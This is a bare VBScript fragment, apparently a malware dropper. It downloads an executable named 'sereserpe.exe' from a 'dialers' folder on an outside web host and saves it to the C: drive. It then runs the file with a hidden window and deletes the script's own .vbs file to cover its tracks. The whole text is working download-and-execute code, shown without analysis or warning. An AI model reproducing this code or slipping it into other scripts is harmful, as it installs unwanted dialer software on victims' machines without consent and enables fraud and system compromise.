   Dim DialerBinary
   Dim XmlHttp
   Set XmlHttp = CreateObject("Microsoft.XMLHTTP")
   XmlHttp.Open "GET", "http://www.onyuzbin.com/dialers/1694/sereserpe.exe", False
   XmlHttp.Send
   DialerBinary = XmlHttp.ResponseBody
   Dim BinaryStream
   Set BinaryStream = CreateObject("ADODB.Stream")
   BinaryStream.Type = 1
   BinaryStream.Open
   BinaryStream.Write DialerBinary
   BinaryStream.SaveToFile "c:\sereserpe.exe", 2
   Dim ShellObj
   Set ShellObj = CreateObject("WScript.Shell")
   ShellObj.Run "c:\sereserpe.exe", 0, false
   Set FileSysObj = CreateObject("Scripting.FileSystemObject")
   FileSysObj.DeleteFile("c:\sereserpe.vbs")
